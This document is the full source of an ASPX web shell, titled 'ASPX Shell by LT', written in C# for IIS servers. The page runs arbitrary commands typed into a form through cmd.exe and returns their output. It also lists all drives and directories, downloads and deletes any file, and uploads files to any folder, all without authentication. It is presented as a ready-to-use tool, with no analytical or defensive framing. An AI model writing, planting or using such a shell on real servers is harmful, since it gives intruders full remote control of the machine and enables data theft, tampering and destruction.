<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            LoadDirectories();
            LoadDrives();
            LoadDirectoryContents();
        }
    }

    protected void LoadDirectories()
    {
        string dir = GetDirectoryPath();

        string[] dirparts = dir.Split('/');
        string linkwalk = "";
        foreach (string curpart in dirparts)
        {
            if (curpart.Length == 0)
                continue;
            linkwalk += curpart + "/";
            lblPath.Text += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
                                          HttpUtility.UrlEncode(linkwalk),
                                          HttpUtility.HtmlEncode(curpart));
        }
    }

    protected void LoadDrives()
    {
        foreach (DriveInfo curdrive in DriveInfo.GetDrives())
        {
            if (curdrive.IsReady)
            {
                string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
                lblDrives.Text += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
                                                HttpUtility.UrlEncode(driveRoot),
                                                HttpUtility.HtmlEncode(driveRoot));
            }
        }
    }

    protected void LoadDirectoryContents()
    {
        string dir = GetDirectoryPath();
        DirectoryInfo di = new DirectoryInfo(dir);

        foreach (DirectoryInfo curdir in di.GetDirectories())
        {
            string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
                                        HttpUtility.UrlEncode(Path.Combine(dir, curdir.Name)),
                                        HttpUtility.HtmlEncode(curdir.Name));
            lblDirOut.Text += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
        }

        foreach (FileInfo curfile in di.GetFiles())
        {
            string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
                                        HttpUtility.UrlEncode(Path.Combine(dir, curfile.Name)),
                                        HttpUtility.HtmlEncode(curfile.Name));
            string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
                                        HttpUtility.UrlEncode(dir),
                                        HttpUtility.UrlEncode(Path.Combine(dir, curfile.Name)));
            lblDirOut.Text += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
        }
    }

    protected void btnExecute_Click(object sender, EventArgs e)
    {
        string command = txtCmdIn.Text.Trim();

        if (!string.IsNullOrEmpty(command))
        {
            ExecuteCommand(command);
        }
    }

    protected void ExecuteCommand(string command)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + command;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.WorkingDirectory = GetDirectoryPath();
        p.Start();

        lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        txtCmdIn.Text = "";
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (flUp.HasFile)
        {
            string fileName = flUp.FileName;
            flUp.SaveAs(Path.Combine(GetDirectoryPath(), fileName));
        }
    }

    protected void btnDelete_Click(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(Request.QueryString["del"]))
        {
            string filePath = Server.MapPath(Request.QueryString["del"]);
            File.Delete(filePath);
        }
    }

    protected string GetDirectoryPath()
    {
        string dir = Page.MapPath(".") + "/";
        if (Request.QueryString["fdir"] != null)
        {
            dir = Request.QueryString["fdir"] + "/";
        }
        dir = dir.Replace("\\", "/");
        dir = dir.Replace("//", "/");
        return dir;
    }
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
				</p>
				<p>
					Working directory:<br />
					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
				</table>
				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>
			</td>
		</tr>
    </table>

    </form>
</body>
</html>